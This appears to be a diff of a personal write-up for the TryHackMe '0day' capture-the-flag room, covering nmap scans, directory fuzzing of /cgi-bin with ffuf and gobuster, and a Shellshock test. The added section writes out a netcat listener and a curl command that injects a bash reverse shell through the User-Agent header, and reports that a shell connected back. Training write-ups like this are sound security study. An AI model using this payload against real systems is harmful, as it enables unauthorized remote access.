@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-09T13:49:19.964+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-11T12:21:41.550+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
 ---
 
 
@@ -13,15 +13,17 @@
 
 As always a full nmap scan is required to discover running services and active ports on the system. 
 
-
+![](/img/user/Attachments/nmap%201.png)
 
 Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 
+
+![](/img/user/Attachments/2nmap%202.png)
 
 
 -------
 ## Enumeration
 
-#### Endpoints Discovered
+ **Endpoints Discovered**
 * /secret > random turtle image
 * /admin > blank 
 * /backup > ssh key 
@@ -98,6 +100,48 @@ Apache HTTP Server 1.3.22 through 1.3.27 on OpenBSD allows remote attackers to o
 ![](/img/user/Attachments/udp.png)
 
 Port 68 which is used by the DHCP is open/filtered. Filtered suggests that the firewall is blocking the requests from nmap. Further investigation must be done to confirm the availability of the service. 
+
+#### Looking for Shellshock Vulnerability
+
+/test.cgi endpoint reveals 
+
+```bash
+ffuf -u http://10.81.145.65/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.tx  
+t -e .cgi,.sh,.p1,.py
+```
+
+![](/img/user/Attachments/testcgi.png)
+
+```bash
+gobuster dir -u http://10.81.145.65/cgi-bin -w /usr/share/wordlists/dirb/common  
+.txt -x cgi,sh,p1,py -o cgi.out
+```
+
+![](/img/user/Attachments/gobuster-test.png)
+
+Let's test for the shellshock vulnerability against this endpoint since no CVE was revealed during the use of nmap or nikto
+
+**Step 1 Set up a Listener**
+```bash
+nc -nvlp 4444
+```
+
+
+**Send the Shellshock Payload**
+```bash
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.225.98/4444 0>&1" http://10.81.145.65/cgi-bin/test.cgi
+```
+
+![](/img/user/Attachments/shelllshock-payload-connection-received.png)
+
+And it appears it is indeed vulnerable to the Shellshock vulnerability. A connection has been received by netcat.
+
+
+
+
+
+
+
 
 
 -----
